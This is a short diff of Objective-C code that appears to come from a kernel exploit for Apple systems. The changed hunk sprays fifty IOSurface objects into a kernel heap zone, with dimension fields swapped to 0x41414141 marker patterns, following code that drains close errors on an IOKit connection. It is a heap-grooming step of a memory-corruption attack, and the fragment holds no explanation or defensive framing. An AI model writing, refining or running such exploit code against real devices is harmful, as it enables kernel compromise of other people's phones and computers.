@@ -3501,12 +3501,12 @@ static const char kOpenPropertiesGarbage[] =
                                  &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
             if (ckr != KERN_SUCCESS) drainCloseErrs++;
         }
-        // Spray IOSurface props (~48 bytes each) into kalloc.48 BEFORE reopen
+        // Spray IOSurface with magic pattern 0x41414141 encoded in allocSize
         for (int s = 0; s < 50; s++) {
             IOSurfaceRef sf = IOSurfaceCreate((CFDictionaryRef)@{
-                (id)kIOSurfaceWidth: @(1), (id)kIOSurfaceHeight: @(1),
-                (id)kIOSurfaceBytesPerRow: @(4), (id)kIOSurfaceBytesPerElement: @(4),
-                (id)kIOSurfacePixelFormat: @(0), (id)kIOSurfaceAllocSize: @(4),
+                (id)kIOSurfaceWidth: @(0x41), (id)kIOSurfaceHeight: @(0x41),
+                (id)kIOSurfaceBytesPerRow: @(0x4141), (id)kIOSurfaceBytesPerElement: @(4),
+                (id)kIOSurfacePixelFormat: @(0x41414141), (id)kIOSurfaceAllocSize: @(0x4141),
             });
             if (sf) { [spraySurfaces addObject:(__bridge id)sf]; CFRelease(sf); }
         }
